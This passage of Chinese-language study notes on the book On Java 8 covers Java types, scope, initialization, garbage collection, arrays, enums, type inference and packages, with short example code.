alt></li><li>包装类：可以将基本类型呈现为位于堆上的非原始对象。“自动装箱”机制能够将基本类型对象自动转换为包装类对象</li><li>高精度数字<ul><li>BigInter可以支持任意精度的整数</li><li>BigDecimal用户任意精度的定点数</li></ul></li></ul><h4 id="3.2.3-java%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84" tabindex="-1">3.2.3 Java中的数组</h4><ul><li>许多编程语言都支持数组，然而在C和C++中，数组的本质是内存块，所以使用数组十分危险。</li><li>Java的一个核心设计目的就是安全。<ul><li>例如Java的数组一定会被初始化，并且无法访问数组边界之外的元素</li><li>这种边界检查的代价是需要消耗少许内存，以及运行时需要少量时间验证索引的正确性。</li><li>其背后的假设是，安全性以及生产力的改善可以完全抵消这种代价。</li></ul></li><li>当创建一个用户防止对象的数组时，数组实际包含的是引用，这些引用会初始化为一个特殊的值null</li></ul><h3 id="3.3-%E6%B3%A8%E9%87%8A" tabindex="-1">3.3 注释</h3><p>java中的注释和C++注释一样</p><pre><code class="language-java">/*   里面的文字都是注释*///这是第二种注释</code></pre><h3 id="3.4-%E6%97%A0%E9%A1%BB%E9%94%80%E6%AF%81%E5%AF%B9%E8%B1%A1" tabindex="-1">3.4 无须销毁对象</h3><h4 id="3.4.1-%E4%BD%9C%E7%94%A8%E5%9F%9F" tabindex="-1">3.4.1 作用域</h4><ul><li>大多数过程式的编程语言都具有作用域(scope)的概念，作用域会决定其范围内定义的变量名的可见性和生命周期。</li><li>C，C++，Java的作用域都通过大括号&quot;{}&quot;来定义</li><li>Java中的变量即使在不同作用域也不能重名，这与C和C++不同</li></ul><h4 id="3.4.2-%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F" tabindex="-1">3.4.2 对象的作用域</h4><ul><li>Java对象的生命周期和基本类型不同，使用new创建一个对象后，该对象在作用域结束后依然存在</li></ul><pre><code class="language-java">&#123;  String s = new String(&quot;a string&quot;);&#125;</code></pre><ul><li>在上面代码中，虽然引用s会在作用域结束后消失，但它指向的String对象还会继续占用内存</li><li>Java中垃圾收集器会见时所有通过new创建的对象，并及时的发现哪些对象不再被引用，然后它会释放这些对象所占用的内存<ul><li>这类机制解决了一类非常严重的编程问题：由于程序员忘记释放内存而导致的“内存泄漏（memory leak）”</li></ul></li><li>而在C++中，你不仅要确保对象在需要时随时可用，而且事后还要负责销毁对象</li></ul><h3 id="3.5-%E4%BD%BF%E7%94%A8class%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%9B%E5%BB%BA%E6%96%B0%E7%B1%BB%E5%9E%8B" tabindex="-1">3.5 使用class关键字创建新类型</h3><ul><li>在class关键字后面跟着新的类名创建对象</li></ul><pre><code class="language-java">class ATypeName&#123;  //类的具体实现&#125;ATypeName a = new ATypeName();//使用new关键字创建一个该类的对象</code></pre><ul><li><p>当定义一个类时，可以为其定义两种元素：字段（也称“数据成员”）和方法（也称“成员函数”）</p></li><li><p>基本类型的默认值：</p><ul><li>当一个类的字段是基本类型时，即使没有初始化，也会用有默认值</li><li>这一特点保证了基本类型的字段一定会被初始化（C++不会这么做）<br><img src="/images/PL/OnJava8/3_2.jpg" alt></li></ul></li><li><p>这种机制不会引用与局部变量，因为局部变量不是类的字段。</p></li><li><p>未赋值的局部变量可能回事一个任意值，但在Java中，这将会是一个编译错误，C++中只是警告</p></li></ul><h3 id="3.6-%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8F%82%E6%95%B0%E4%BB%A5%E5%8F%8A%E8%BF%94%E5%9B%9E%E5%80%BC" tabindex="-1">3.6 方法，参数以及返回值</h3><ul><li><p>Java中方法决定了对象可以接受那些信息（也是其它语言中的函数），由最基础的4个部分构成：方法名，参数，返回值，方法体</p><ul><li>方法名和参数列表共同构成了方法的“签名”（signature），方法签名即该方法的唯一标识符</li></ul></li><li><p>参数列表中，实际操作的是引用</p></li></ul><h3 id="3.7-%E7%BC%96%E5%86%99java%E7%A8%8B%E5%BA%8F" tabindex="-1">3.7 编写Java程序</h3><ul><li><p>名称可见性：在不同模块中使用想用名称如何区分</p><ul><li>C++：使用命名空间的概念</li><li>Java：将互联网域名反转，因为域名是唯一的，以此来描述库的名称</li></ul></li><li><p>使用其他组件</p><ul><li>使用import关键字告知Java编译器你想要使用哪个类</li><li>许多编程风格指出，每一个用到的类应该被单独导入</li></ul></li><li><p>static关键字解决两个问题</p><ul><li><ol><li>需要一个共享空间保存某个特定的字段，而不关心创建多少对象，甚至没有对象</li></ol></li><li><ol start="2"><li>需要使用一个类的某个方法，而该方法和具体的对象无关</li></ol></li></ul></li><li><p>static的字段或方法不依赖于任何对象，非static的字段和方法需要创建一个对象才能使用</p></li><li><p>使用“类数据”“类方法”来表示该数据或方法只服务于类，而非特定的对象</p></li><li><p>调用static变量的两种方法</p><ul><li>通过对象调用</li><li>通过类名调用（推荐使用，体现变量的static特质）</li></ul></li></ul><h3 id="3.8-%E7%AC%AC%E4%B8%80%E4%B8%AAjava%E7%A8%8B%E5%BA%8F" tabindex="-1">3.8 第一个Java程序</h3><ul><li>程序启动的入口方法main()</li></ul><pre><code class="language-java">public static void main(String[] args)&#123;&#125;</code></pre><ul><li>public关键字代表这个方法可以被外部程序所调用</li><li>main参数是一个String数组，该数组用户获取控制台的输入，Java编译器强制传递该参数</li></ul><h3 id="3.9-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC" tabindex="-1">3.9 编程风格</h3><ul><li>驼峰命名法<ul><li>类名只有单词的首字母大写，单词间直接连接</li><li>方法，字段，变量以及对象名，首字母小写，其他和类名一样</li></ul></li></ul><h2 id="04-%E6%93%8D%E4%BD%9C%E7%AC%A6" tabindex="-1">04 操作符</h2><p>这里和C++很像，就粗略过了</p><ul><li><p>对象赋值时，真正操作的是对象的引用</p><ul><li><code>c=d</code>意味着将c和d都指向原本只有d指向的那个对象</li><li>这种现象也成为“别名”，在参数传递时也会产生别名，在进阶卷将会详解</li></ul></li><li><p>Java中不能将非布尔值当布尔值使用</p></li><li><p>逻辑操作符支持一种名为“短路”的现象</p><ul><li>一旦表达式当前部分的结算结果能够明确无误地确定整个表达式，那么余下的部分不会再执行</li><li><code>f(a) &amp; f(b) &amp; f(c)</code>,若<code>f(a)</code>为假，则<code>f(b),f(c)</code>都不用执行</li></ul></li><li><p>字面量</p><ul><li>字面量的后缀标识了类型<ul><li>大写或小写的L表示long<code>200L,200l</code></li><li>大写或小写的F表示float<code>200.0F,200.0f</code></li><li>大写或小写的D表示double<code>200D,200d</code></li></ul></li><li>前缀可以标识进制<ul><li>16进制 <code>0x12 | 0X12</code></li><li>八进制 <code>012</code></li><li>二进制 <code>0b12 | 0B12</code><ul><li>通过Integer和Long的toBinaryString()方法可以将整数转为二进制串</li></ul></li></ul></li><li>可以在数字字面量中间使用下划线，便于阅读，同时有一些规则限制（java 7新增功能）</li></ul></li><li><p>移位操作符</p><ul><li>左移，右端补0</li><li>右移<ul><li>有符号右移，进行符号扩展，正数高位插0，复数高位插1</li><li>无符号右移，使用<code>&gt;&gt;&gt;</code>，默认高位插0</li></ul></li></ul></li><li><p>Java中无法自动将int型转换为boolean型，或者说boolean类型不允许进行任何类型的转湖岸</p></li><li><p>如果对小于 int 类型的基本数据类型（即 char、byte 或者 short）执行算术运算或按位运算，运算执行前这些值就会被自动提升为 int，结果也是 int 类型，如果要把结果赋值给较小的类型，就必须使用强制类型转换（由于把值赋给了较小的类型，可能会出现信息丢失）。</p></li><li><p>Java不需要sizeof()，因为Java具有可移植性，所有数据类型在所有机器中大小都是相同的</p></li></ul><h2 id="05-%E6%8E%A7%E5%88%B6%E6%B5%81" tabindex="-1">05 控制流</h2><p>这里和C++很像，就粗略过了</p><pre><code class="language-java">if(Boolean-expression)  statementelse   statementwhile(Boolean-expression)  statementdo  statementwhile(Boolean-expression)for(initialization;Boolean-expression;step)  statement//Java5 引入更简洁的for，用于数组和容器for(Object object:objectSequence)  statement</code></pre><ul><li>编程语言一开始就有goto，可以说goto是条件控制的起源<ul><li>Java中没有goto</li><li>但有一个相似的标签，在Java中使用标签的<strong>唯一</strong>理由是用到了嵌套循环</li><li>带标签的break，continue是较少使用的实验性功能，因此此前没有其它编程语言先例</li></ul></li></ul><pre><code class="language-java">label1:outer-iteration &#123; inner-iteration &#123; // ... break; // [1] // ... continue; // [2] // ... continue label1; // [3] 跳到标签处，随后继续循环 // ... break label1; // [4] 跳到标签出，随后跳出循环 &#125;&#125;</code></pre><ul><li>switch语句实现多路选择的简洁方式<ul><li>Java7之前选择器的执行结果只能是整数，之后可以使用字符串</li><li>可以通过enum和switch结合使用</li></ul></li></ul><pre><code class="language-java">switch(integral-selector)&#123;  case intrgral-value1:statement;break;  case intrgral-value2:statement;break;  case intrgral-value3:statement;break;  // ...  default:statement&#125;</code></pre><h2 id="06-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E6%B8%85%E7%90%86" tabindex="-1">06 初始化和清理</h2><ul><li>初始化（initialization）和清理（cleanup）正式导致“不安全”编程的两个因素</li><li>C++引入了构造器（constructor）的概念，Java同样，并且引入了一个垃圾收集器（garage collector）</li></ul><h3 id="6.1-%E7%94%A8%E6%9E%84%E9%80%A0%E5%99%A8%E4%BF%9D%E8%AF%81%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.1 用构造器保证初始化</h3><ul><li>构造器的名字就是类的名字</li><li>构造器可以带参数也可以不带参数</li></ul><h3 id="6.2-%E6%96%B9%E6%B3%95%E9%87%8D%E8%BD%BD" tabindex="-1">6.2 方法重载</h3><ul><li><p>同一个词可以表达不同的含义，即重载</p></li><li><p>构造器只有一个名字，因此必须进行方法重载</p></li><li><p>同名的函数或构造器，每个重载方法必须有独一无二的参数类型列表</p></li></ul><h3 id="6.3-%E6%97%A0%E5%8F%82%E6%9E%84%E9%80%A0%E5%99%A8" tabindex="-1">6.3 无参构造器</h3><ul><li>无参构造器用于创建“默认对象”</li><li>如果创建了一个没有构造器的类，编译器会自动为这个类添加一个无参构造器</li></ul><h3 id="6.4-this%E5%85%B3%E9%94%AE%E5%AD%97" tabindex="-1">6.4 this关键字</h3><ul><li><p>类中的方法有一个隐藏的参数，在所有显式参数之前，代表着<strong>被操作对象的引用</strong></p></li><li><p>this关键字只能在非静态方法中使用，当需要在方法中调用对象的时候，直接使用this即可，表示了对对象的引用</p></li><li><p>在构造器中调用构造器</p><ul><li>因为this本身表示了对对象的引用，那么在this后加上参数列表，它就会显式地调用与该参数列表匹配的构造器</li><li>构造器一次只能调用一个，不能同时调用</li><li>构造器调用必须出现在方法最开始的地方，否则编译器会报错</li></ul></li><li><p>static方法的意思：没有this</p></li><li><p>静态方法有点类似于全局方法，可能看起来不符合面向对象的思想，但确实有其实用之处</p></li></ul><h3 id="6.5-%E6%B8%85%E7%90%86%EF%BC%9A%E7%BB%88%E7%BB%93%E5%92%8C%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86" tabindex="-1">6.5 清理：终结和垃圾收集</h3><h4 id="6.5.1-finialize%E6%96%B9%E6%B3%95" tabindex="-1">6.5.1 finialize方法</h4><ul><li><p>Java有垃圾收集器回收不用的对象，然而仅限于使用new关键字创建的对象</p></li><li><p>如果在不是哟个new的情况下分配了一块特殊内存，Java允许在类中定义一个finialize()方法</p><ul><li>当垃圾收集器准备释放对象资源的时候，首先调用finialize()方法，并且在下一次垃圾收集时才会回收这个对象的内存，因此finialize方法可以在垃圾收集前执行一些重要的清理工作</li></ul></li><li><p>finialize方法和C++中的析构函数不同</p><ul><li>C++中，对象一定要被销毁</li><li>Java中，finialize方法可以在垃圾清理前做一些其它工作，并不是做销毁工作</li></ul></li><li><p>finialize方法的作用</p><ul><li>垃圾收集只与内存有关，但只能回收new出来的对象</li><li>finialize存在原因：没有使用Java中的通用方法来分配内存，采用了类似C语言的机制<ul><li>主要通过<strong>本地方法</strong>来实现，在Java代码中调用非Java代码。Java里的本地方法只支持C和C++，但这些语言可以调用其他语言，所以Java实际可以调用任何代码</li><li>在非Java代码里，比如C的malloc函数，就需要调用相应的free方法来释放内存，需要在finalize方法中通过本地方法调用</li></ul></li></ul></li></ul><h4 id="6.5.2-%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86" tabindex="-1">6.5.2 垃圾收集器的工作原理</h4><ul><li><p>垃圾收集器可以提升对象创建的速度</p><ul><li>可以把C++的堆想象成一个院子，每个对象都有自己的地盘，但地盘可能废弃，需要重新使用</li><li>但Java由于垃圾收集器的存在，堆更像是一个传送带，每次分配对象只是传送带移动，即“堆指针”向前移动，类似C++栈分配（当然记录分配情况会有额外开销，但与查找存储的开销小的多）</li><li>然而堆并不是传送带，否则如果缺页发生的频率过高，性能影响会更加显著。因此在垃圾回收的同时，垃圾收集器会压缩队中的所有对象，方便将“堆指针”移动到靠近传送带起点的位置，从而避免发生却也。即：垃圾收集器在分配存储空间的同时会将对象重新排列，由此实现一个高速的，有无限空闲空间的堆模型</li></ul></li><li><p>JVM采用了一种自适应的垃圾收集方案，至于如何处理找到的存活对象，取决于当前使用的垃圾回收算法</p><ul><li>算法1：“停止-复制”（stop-and-copy）<ul><li>程序首先停止运行，将存活的对象从一个堆复制到另一个堆，剩下的都是垃圾。复制到新堆后，可以从头开始分配，因此新堆十分紧凑，可以像传送带一样分配内存。</li><li>当一个对象从一个地方移动到另一个地方的时，所有指向该对象的引用都必须修改，从栈或静态存储区到这个对象的引用可以立即更改，但在遍历过程中可能出现新指向该对象的其它引用，这些引用需要在找到时进行修复（想象一张旧地址对应新地址的表）</li><li>然而“复制收集器”有两个问题<ul><li><ol><li>需要两个堆，比实际多了一倍空间。一些JVM解决的方法是，将堆划分成块，复制动作在块之间</li></ol></li><li><ol start="2"><li>复制过程本身。一旦程序变得稳定，便很少产生垃圾，甚至没有，此时复制收集器仍会把内存从一个地方复制到另一个地方，为了防止这种情况，一些JVM在检测到没有新垃圾产生后，会切换到不同的垃圾收集算法（<strong>这就是“自适应”）</strong>，如下面的算法</li></ol></li></ul></li></ul></li><li>算法2：“标记-清除”（mark-and-sweep）<ul><li>Sun公司JVM早期版本一直使用该算法，对于一般用途，“标记-清楚”非常慢，但垃圾少或没有时，速度就会很快</li><li>该算法从栈和静态存储开始，遍历所有引用以查找存活对象，没找到一个存活对象，会给对象设置一个标志–此时尚未开始收集。只有在标记过程完成后才会开始清楚。清除过程中，没有标记的对象被释放，但不会发生复制，因此收集器如果压缩堆里的碎片需要重新排列对象。</li></ul></li><li>比较<ul><li>“停止-复制”：不是在后台完成，程序在垃圾收集时会停止</li><li>“标记-清除”：在后台完成，</li><li>垃圾收集器在内存不足时都会停止程序，且有些垃圾收集器会主动停止程序</li></ul></li></ul></li><li><p>具体方案：此处的JVM里，内存以较大的块的形式分配</p><ul><li>严格地“停止-复制”需要将每个存活的对象从旧堆分配到新堆，有了块之后，垃圾收集器可以将对象直接复制到废弃地块中，每个块中都有一个<strong>代数</strong>来跟踪它是否活着。</li><li>通常，只压缩上次垃圾收集依赖创建地块（这里面多是临时变量，生命周期短，很快称为垃圾）。如果块在某处被引用，认为其存活，垃圾收集过程中，存活对象不会被压缩或复制，而是增加代数。这样，可以很方便地处理正常情况下地大量短期临时对象。垃圾回收期会周期性地进行全面清理，不过大对象仍然不会被复制（只是增加他们所占块地代数）</li><li>JVM会监控垃圾收集地效率，如果所有对象都很稳定，垃圾收集器效率很低地话，会切换到“标记-清除”算法。同样，JVM会跟踪标记和清除地效果，如果堆里出现很多碎片，会切换回“停止-复制”算法，这就是 **“自适应”**的用武之地</li><li>由此会得到一个啰嗦的称呼：“自适应的，分代的，停止-复制，标记-清除”垃圾收集器</li></ul></li><li><p>JVM中有很多技术可以提升速度，其中一项重要的是“即时(just-in-time，JIT)编译器”，其与加载器的操作有关</p><ul><li>JIT会键该程序部分或全部编译为本地机器码，这样不需要JVM的解释，从而<strong>运行得更快</strong></li><li>当需要加载一个类得时候，会先定位.class文件，然后将类的字节码加载到内存。JIT会根据实际执行情况进行<strong>动态优化</strong>,会监控代码的执行频率和模式，根据这些信息生成更高效的机器码，这种动态优化使得程序在运行时会逐渐变得更快，尽管在编译时可能会慢一点</li><li><strong>惰性评估和选择性编译</strong>：JIT编译器可以根据需要对代码进行即时编译。它可以延迟编译，只在代码被频繁执行时才进行编译，避免了对不常执行的代码进行编译的浪费。这种选择性编译可以减少启动时间，并且只对真正需要优化的代码进行编译。</li><li><strong>跨平台兼容性</strong>：JIT编译器能够根据不同的硬件和操作系统生成特定的本地机器码，因此可以实现跨平台的兼容性。通过JIT编译器，Java程序可以在不同的平台上运行，而不需要重新编写和调整代码。</li></ul></li></ul><h3 id="6.6-%E6%88%90%E5%91%98%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.6 成员初始化</h3><ul><li><p>基本类型字段会有一个初始值，对象初始值为null</p></li><li><p>如果一个对象未被初始化而被使用，会得到一个<strong>异常</strong>的运行错误</p></li><li><p>可以通过方法进行初始化，方法的参数需要已经初始化了</p></li></ul><pre><code class="language-java">public class MethodInit2 &#123; int i = f(); int j = g(i); int f() &#123; return 11; &#125; int g(int n) &#123; return n * 10; &#125;&#125;</code></pre><h3 id="6.7-%E6%9E%84%E9%80%A0%E5%99%A8%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.7 构造器初始化</h3><ul><li><p>使用构造器进行初始化，为编程带来了更大的灵活性，但者不能阻止自动初始化的执行</p></li><li><p>类中的变量定义决定了初始化的顺序，即使分散到方法定义之间，变量定义仍然会在任何方法（包括构造器）调用之前就被初始化<br><img src="/images/PL/OnJava8/6_1.jpg" alt></p></li><li><p>静态变量在初始化时首先初始化，这里举一个例子</p></li><li><p>假设有一个Dog类，同时有一个主函数类，主函数类里面有一个main函数和一些静态变量</p><ul><li><ol><li>调用main函数的时候，会加载main函数所在的类，这时会先初始化类中的静态变量，在其它变量</li></ol></li><li><ol start="2"><li>main函数中new Dog对象，尽管没有显式的使用static关键字，但构造器实际上也是静态的，当第一次创建Dog对象或访问Dog类的静态方法时，Java解释器会搜索类路径定位Dog.class包</li></ol></li><li><ol start="3"><li>当 Dog.class 被加载后（这将创建一个 Class 对象，后面会介绍），它的所有静态初始化工作都会执行。因此，静态初始化只在 Class 对象首次加载时发生一次。</li></ol></li><li><ol start="4"><li>当使用 new Dog() 创建对象时，构建过程首先会在堆上为 Dog 对象分配足够的存储空间</li></ol></li><li><ol start="5"><li>这块存储空间会被清空，然后自动将该 Dog 对象中的所有基本类型设置为其默认值（数值类型的默认值是 0，boolean 和 char 则是和 0 等价的对应值），而引用会被设置为null。</li></ol></li><li><ol start="6"><li>执行所有出现在字段定义处的初始化操作</li></ol></li><li><ol start="7"><li>执行构造器</li></ol></li></ul></li><li><p>显式的静态初始化：Java允许在一个类中将多个静态初始化语句放在一个特殊的“静态子句”中（有时称为<strong>静态块</strong>）。这段代码和其它静态初始化语句一样，只执行一次：：第一次创建该类的对象时，或第一次访问该类的静态成员时（即使从未创建过该类的对象）。</p></li></ul><pre><code class="language-java">class Cup &#123; Cup(int marker) &#123; System.out.println(&quot;Cup(&quot; + marker + &quot;)&quot;); &#125; void f(int marker) &#123; System.out.println(&quot;f(&quot; + marker + &quot;)&quot;); &#125;&#125;class Cups &#123; static Cup cup1; static Cup cup2; static &#123; cup1 = new Cup(1); cup2 = new Cup(2); &#125; Cups() &#123; System.out.println(&quot;Cups()&quot;); &#125;&#125;public class ExplicitStatic &#123; public static void main(String[] args) &#123; System.out.println(&quot;Inside main()&quot;); Cups.cup1.f(99); // [1] &#125; // static Cups cups1 = new Cups(); // [2] // static Cups cups2 = new Cups(); // [2]&#125;</code></pre><ul><li>非静态实例的初始化：Java 提供了一种称为实例初始化（instance initialization）的类似语法，用于初始化每个对象的非静态变量。</li></ul><pre><code class="language-java">class Mug &#123; Mug(int marker) &#123; System.out.println(&quot;Mug(&quot; + marker + &quot;)&quot;); &#125;&#125;public class Mugs &#123; Mug mug1; Mug mug2; &#123; // [1] mug1 = new Mug(1); mug2 = new Mug(2); System.out.println(&quot;mug1 &amp; mug2 initialized&quot;); &#125; Mugs() &#123; System.out.println(&quot;Mugs()&quot;); &#125; Mugs(int i) &#123; System.out.println(&quot;Mugs(int)&quot;); &#125; public static void main(String[] args) &#123; System.out.println(&quot;Inside main()&quot;); new Mugs(); System.out.println(&quot;new Mugs() completed&quot;); new Mugs(1); System.out.println(&quot;new Mugs(1) completed&quot;); &#125;&#125;</code></pre><ul><li>除了缺少 static 关键字外，实例初始化子句看起来与静态初始化子句完全相同。此语法对于支持匿名内部类的初始化是必需的（参见第 11 章），但也可以用来保证无论调用哪个显式的构造器，某些操作都会发生。</li></ul><h3 id="6.8-%E6%95%B0%E7%BB%84%E5%88%9D%E5%A7%8B%E5%8C%96" tabindex="-1">6.8 数组初始化</h3><ul><li><p>数组是一个对象序列或基本类型序列，其中元素类型相同，用一个标识符名字打包在一起</p></li><li><p>数组通过方括号**索引操作符(index operator)[]**来定义和使用，数组有以下两种定义</p><ul><li>类型名字前后加上空方括号<code>int[] a1;</code></li><li>也可像C++<code>int a1[]</code></li><li>然而第一种可能更合理，表示类型是一个“int数组”</li></ul></li><li><p>编译器不允许指定数组的大小。<strong>数组名只是一个引用</strong>（已经为引用分配了），但并没有为数组对象本身分配任何空间</p></li><li><p>要为数组对象分配空间，需要编写一个初始化表达式</p><ul><li>初始化可以出现在任何地方</li><li>特殊的初始化是在创建数组的地方使用一组花括号括起来的值，这是编译器负责存储的分配<code>int[] a1 = &#123; 1, 2, 3, 4, 5 &#125;;</code></li></ul></li><li><p>所有数组有一个固有成员，length，元素从0开始计数，最大下标length-1</p><ul><li>越届时C和C++会默默接受，并允许访问所有内存，这是许多臭名昭著的错误来源</li><li>而Java会通过抛出<strong>异常</strong></li></ul></li></ul><h4 id="6.8.1-%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E5%88%9B%E5%BB%BA" tabindex="-1">6.8.1 动态数组创建</h4><ul><li>这里指在程序中指定数组大小进行创建</li><li>也可通过花括号包围列表来初始化对象数组</li></ul><pre><code class="language-java">Object[] a = &#123;object1 ...&#125;;//只能用在定义数组的时候Object[] b= new Object[int];Object[] c= new Object[]&#123;object1 ...&#125;;//可以用到任何地方</code></pre><h4 id="6.8.2-%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E5%BA%8F%E5%88%97" tabindex="-1">6.8.2 可变参数序列</h4><ul><li><p>Java提供了类似C语言得<strong>可变参数列表</strong>（C中简称varargs），来创建和调用有可变参数的方法，包括数量可变的参数和未知类型的参数</p></li><li><ol><li>由于所有类都继承Object，因此可以创建一个接受Object数组的方法<code>static void printArray(Object[] args) </code></li></ol></li><li><ol start="2"><li>Java5后，可以使用省略号定义一个可变参数列表<code>static void printArray(Object... args)</code>,这里编译器会自动填充，得到的仍然是数组，可变参数列表也可以是基本变量</li></ol></li><li><ol start="3"><li>可变参数字段和非可变参数可以混用，以此得到好的重载</li></ol></li></ul><h3 id="6.9-%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8B" tabindex="-1">6.9 枚举类型</h3><pre><code class="language-java">//创建一个枚举类public enum Spiciness &#123; NOT, MILD, MEDIUM, HOT, FLAMING&#125;//使用枚举类public class SimpleEnumUse &#123; public static void main(String[] args) &#123; Spiciness howHot = Spiciness.MEDIUM; System.out.println(howHot); &#125;&#125;</code></pre><ul><li>其它方法<ul><li><code>toString()</code>，更方便地显式enum实例地名字</li><li><code>ordinal()</code>,来表示特定enum常量地声明顺序</li><li><code>values()</code>,按照顺序生成一个enum常量值地数组</li></ul></li><li>enum可以和switch语句很好地连用</li></ul><h3 id="6.10-%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%9A%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD" tabindex="-1">6.10 新特性：类型推断</h3><ul><li>最早在JDK10中启用，JDK11中优化。</li><li>再一个局部定义中（即在方法内部），编译器可以自动发现类型，这就是<strong>类型推断（type inference）</strong>，我们可以通过var关键字启用它</li></ul><pre><code class="language-java">public class TypeInference &#123; void method() &#123; // 显式类型： String hello1 = &quot;Hello&quot;; // 类型推断： var hello = &quot;Hello!&quot;; // 用户定义的类型也起作用： Plumbus pb1 = new Plumbus(); var pb2 = new Plumbus(); &#125; // 静态方法里也可以启用： static void staticMethod() &#123; var hello = &quot;Hello!&quot;; var pb2 = new Plumbus(); &#125;&#125;</code></pre><ul><li>var的限制<ul><li>必须提供足够的信息来推断类型，不可使用var声明变量没有初始值或为空</li><li>函数返回值不能是var</li><li>类型推断不能用于方法的参数。<strong>Java不支持默认参数default argument,但可以通过重载来实现,</strong></li></ul><pre><code class="language-java">public class MyClass &#123;  public void myMethod(int x, int y) &#123;      // 方法的具体实现  &#125;  public void myMethod(int x) &#123;      int defaultY = 10; // 默认值      myMethod(x, defaultY); // 调用另一个重载方法，提供默认值  &#125;&#125;</code></pre><pre><code class="language-C++">#include &lt;iostream&gt;// 带有默认参数的函数声明void printMessage(const std::string&amp; message = &quot;Hello, World!&quot;);int main() &#123;    // 调用函数时不提供参数    printMessage();  // 输出：Hello, World!    // 调用函数时提供参数    printMessage(&quot;Hello, C++!&quot;);  // 输出：Hello, C++!    return 0;&#125;// 带有默认参数的函数定义void printMessage(const std::string&amp; message) &#123;    std::cout &lt;&lt; message &lt;&lt; std::endl;&#125;</code></pre></li><li>var很适合for循环，C++中的auto也是类型推断</li></ul><h3 id="6.11-%E6%80%BB%E7%BB%93" tabindex="-1">6.11 总结</h3><ul><li>C中变量初始化不当导致了很多的问题，而Java的构造器可以保证正确的初始化和处理</li><li>C++中，“析构”非常重要，因为使用new创建的对象必须显式销毁，而Java中垃圾收集器会自动为所有对象释放内存，特殊情况需要手动<ul><li>在不需要类似析构函数行为的情况下，Java的垃圾收集器极大地简化了编程工作，增阿吉了管理内存方面急需的安全性</li><li>但同时增加了运行成本，Java的速度问题是它设计某些特定编程领域的障碍</li></ul></li></ul><h2 id="07-%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F" tabindex="-1">07 实现隐藏</h2><ul><li><strong>重构</strong>的主要动机之一就是重写已经能正常工作的代码，提升其可读性、可理解性和可维护性</li><li>面向对象设计的一个主要考虑是“将变化的事物与保持不变的事物分离”。</li><li>Java提供了**访问权限修饰符(access specifier)**来允许库开发者说明哪些是对客户程序员可用的，哪些是不可用的。</li><li>访问控制级别从“最多访问”到“最少访问”依次是：public、protected、包内访问（package access，没有关键字）和private。</li><li>Java中package关键字 将组件捆绑成一个内聚的库单元</li></ul><h3 id="7.1-package%EF%BC%9A%E5%BA%93%E5%8D%95%E5%85%83" tabindex="-1">7.1 package：库单元</h3><ul><li><p>一个包（package）包含了一组类，这些类通过同一个命名空间（namespace）组织在了一起。</p><ul><li>使用包的一种方式是指定全名，如<code>java.util.ArrayList list =new java.util.ArrayList();</code>,但这样会很冗长</li><li>此时可以使用import关键字，导入单个类<code>import java.util.ArrayList;</code>，此后可以不受限制的使用<code>ArrayList</code></li><li>同时也可以导入某个包中的全部内容<code>import java.util.*;</code>，这里使用了通配符</li><li>导入包提供了一种管理命名空间的机制</li></ul></li><li><p>一个Java源代码文件是一个<strong>编译单元</strong>（或称<strong>转移单元</strong>）</p><ul><li>每个编译单元需要有一个.java结尾的文件名</li><li>在编译单元内，可以有且只能有一个public类，否则编译器会报错</li><li>如果该编译单元中有其他类，则在该包之外是看不到的，因为这些类不是public的，而是主public类的支持类(support class)</li></ul></li></ul><h4 id="7.1.1-%E4%BB%A3%E7%A0%81%E7%BB%84%E7%BB%87" tabindex="-1">7.1.1 代码组织</h4><ul><li>编译一个.java文件时，文件中的每一个类都会产生一个输出文件，其名字是.java文件中对应的类的名字，但扩展名为.class</li><li>Java中一个可运行程序就是一堆.class文件，可以使用jar归档器将它们打包压缩成一个Java档案文件(JAR)。Java解释器负责查找,加载和解释这些文件</li><li>库是一组这样的类文件，每个源文件有一个public类和其它非public类，即每个源文件都有一个公共组件，使用package关键字使得组件都属于一个命名空间</li><li>package语句出现在文件中第一个非注释处,如以下代码便是该编译单元位于hiding的命名空间中，任何使用该类都必须指定名称或者导入包(Java包的命名规则是全部小写字母)</li></ul><pre><code class="language-java">package hiding.mypackage;public class MyClass &#123; // ...&#125;</code></pre><h4 id="7.1.2-%E5%88%9B%E5%BB%BA%E7%8B%AC%E4%B8%80%E6%97%A0%E4%BA%8C%E7%9A%84%E5%8C%85%E5%90%8D" tabindex="-1">7.1.2 创建独一无二的包名</h4><ul><li><p>包的整理：将所有的.class文件放在一个目录中，使用操作系统的分层文件结构</p></li><li><p>将包文件收集到单个子目录中解决了另外两个问题：</p><ul><li><ol><li>创建唯一的包名</li></ol></li><li><ol start="2"><li>找到那些可能隐藏在某个目录结构中的类</li></ol></li></ul></li><li><p>按照惯例</p><ul><li>package 名称的第一部分是类创建者的反向的因特网域名。因为因特网域名是唯一的</li><li>第二部分是将 package 名称解析为你机器上的一个目录这样当 Java 解释器需要加载一个 .class 文件时，它就可以定位到该 .class 文件所在的目录。</li></ul></li><li><p>环境变量CLASSPATH，CLASSPATH 包含了一个或多个目录，用作查找 .class 文件的根目录</p><ul><li>使用Maven或Gradle时，可以使用其响应的代码目录</li></ul></li><li><p>通过import中*导入的两个库里有相同名称的类</p><ul><li>如果不编写导致冲突的代码，则不会有问题</li><li>或者将某个类的导入转化为单类导入，使用完全指定名称的形式</li></ul></li></ul><h4 id="7.1.3-%E5%AE%9A%E5%88%B6%E5%B7%A5%E5%85%B7%E5%BA%93" tabindex="-1">7.1.3 定制工具库</h4><ul><li>通过包创建自己的util工具库</li></ul><h4 